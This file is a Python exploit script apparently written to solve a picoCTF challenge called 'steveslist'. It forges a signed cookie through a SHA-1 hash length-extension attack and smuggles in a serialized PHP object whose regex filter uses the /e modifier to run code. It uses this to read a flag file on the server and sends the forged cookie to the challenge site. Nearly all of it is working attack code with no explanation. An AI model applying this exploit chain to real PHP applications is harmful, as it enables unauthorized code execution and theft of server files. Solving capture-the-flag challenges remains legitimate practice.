import subprocess
import urllib
from pwn import *
import commands
import sys
import hlextend
import urllib2
import cookielib
import requests
import subprocess


def encode(s):
    print "ENCODE: " + s
    s = s.replace("\x00", "\0")
    encode_php = "<?php $text = <<<EOD\n{}\nEOD;\necho urlencode($text);\n?>".format(s)

    with open('encode_me.php', 'w') as f:
        f.write(encode_php)

    output = subprocess.check_output('php encode_me.php', shell=True)
    return output

url = 'http://steveslist.picoctf.com'
flag_file = '/home/daedalus/flag.txt'
php_script = """
<?php
require_once('steves_list_backup/includes/classes.php');
$filter = [new Filter('/^(.*)/e', 'file_get_contents(\\\'{}\\\')')];

$text = "file_get_contents";
$text = htmlspecialchars($text);

$title = "yay_flag";
$title = htmlspecialchars($title);

$post = new Post($title, $text, $filter);

$post_ser = serialize($post);

$ser = $post_ser;
echo $ser;
?>
""".format(flag_file)

with open('phpscript.php', 'w') as f:
    f.write(php_script)

php_output = subprocess.check_output('php phpscript.php', shell=True, stderr=subprocess.STDOUT)
print '-' * 10 + " ORIGINAL OUTPUT " + '-' * 10
print php_output
# php_output = php_output.split('<')[0].replace('\x00', '')
php_output = php_output.split('<')[0]

print '-' * 10 + " PHP OUTPUT " + '-' * 10
print php_output
php_output = php_output.split('\n')[1]

original_hash = '2141b332222df459fd212440824a35e63d37ef69'
original_data = 'b:1;'
appended_data = '\x0a' + php_output
key_length = 8

print '-' * 10 + " HLEXTEND ARGS " + '-' * 10
print original_hash
print original_data
print appended_data

sha = hlextend.new('sha1')
cookie = sha.extend(appended_data, original_data, key_length, original_hash)
cookie_hash = sha.hexdigest()

print "COOKIE: " + cookie
print "HASH: " + cookie_hash

output = encode(cookie)
# output = cookie
cookies = {'custom_settings_hash': cookie_hash,
           'custom_settings': output}
print cookies
print requests.get(url, cookies=cookies).text
